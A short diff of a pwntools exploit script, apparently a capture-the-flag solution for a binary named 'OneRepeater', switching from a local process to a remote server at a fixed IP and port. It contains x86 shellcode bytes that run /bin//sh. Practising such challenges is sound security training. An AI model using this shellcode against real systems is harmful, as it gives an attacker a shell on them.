@@ -1,5 +1,5 @@
 from pwn import *
-io = process('OneRepeater')
+io = remote('140.82.19.20',36427)#process('OneRepeater')
 shellcode = '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
 
 io.recvuntil('3) Exit\n')
